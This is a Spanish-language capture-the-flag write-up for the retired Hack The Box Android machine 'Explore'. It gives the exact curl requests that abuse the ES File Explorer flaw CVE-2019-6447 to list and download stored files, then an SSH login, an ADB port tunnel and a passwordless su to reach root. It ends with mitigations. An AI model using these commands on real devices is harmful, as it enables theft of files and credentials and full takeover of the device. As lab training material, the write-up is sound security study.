---
machine: Explore
os: Android
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [android, adb, es-file-explorer, cve-2019-6447]
---

# Explore — Hack The Box (Android)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El puerto 59777 de ES File Explorer permite listar archivos y descargar imágenes sin autenticación (CVE-2019-6447). Una captura contiene la contraseña de `kristi`, que da SSH. Desde dentro se accede a ADB en 5555 por un túnel SSH y `su` sin contraseña entrega root.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
2222/tcp  ssh     SSH Server (Android)
42135/tcp http    ES File Explorer
38925/tcp http    unknown
59777/tcp http    ES File Explorer API
```

## Enumeración

- Nmap identifica Android y varios puertos no estándar.
- 42135 y 59777 pertenecen a ES File Explorer.
- `listPics` enumera `/storage/emulated/0/DCIM`.
- El puerto 5555 (ADB) está filtrado desde el exterior.

## Foothold

La API acepta JSON con `{"command":"listPics"}` y devuelve rutas. Con `getFile` se descarga `creds.jpg`, que contiene una nota con la contraseña de `kristi`.

```bash
curl -s http://<IP>:59777 -d '{"command":"listPics"}'
curl -s http://<IP>:59777 -d '{"command":"getFile","file":"/storage/emulated/0/DCIM/creds.jpg"}' -o creds.jpg
ssh -p 2222 kristi@<IP>
```

## Movimiento lateral

La shell SSH es de usuario normal. `netstat` muestra ADB escuchando en 5555 en localhost. Se reabre SSH con `-L 5555:localhost:5555` y se conecta `adb` desde el atacante.

```bash
ssh -p 2222 -L 5555:localhost:5555 kristi@<IP>
adb connect localhost:5555
adb shell
```

## Escalada de privilegios

Dentro de `adb shell`, `su` no pide contraseña y entrega un contexto de root. La flag de root está en `/data/root.txt`.

```bash
adb shell
su
id
find / -name root.txt 2>/dev/null
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales, si existen, viven en `private/` y no se publican.

## Lecciones aprendidas

- Una app con un servicio HTTP expuesto puede filtrar todo el almacenamiento.
- Las capturas de pantalla suelen contener credenciales.
- ADB accesible en localhost sigue siendo peligroso si hay SSH.
- `su` sin contraseña convierte una shell de usuario en root.

## Mitigaciones y detección

- Desinstalar o actualizar ES File Explorer y cerrar 59777.
- No guardar contraseñas en imágenes ni notas.
- Deshabilitar ADB y no exponer 5555.
- Proteger `su` con autenticación y SELinux estricto.

## Referencias

- [0xdf — Explore](https://0xdf.gitlab.io/2021/10/30/htb-explore.html)
- [Búsqueda de vídeos (CSV)](https://www.youtube.com/results?search_query=ippsec+explore)
- [Búsqueda de writeups (CSV)](https://medium.com/search?q=hackthebox+explore+writeup)
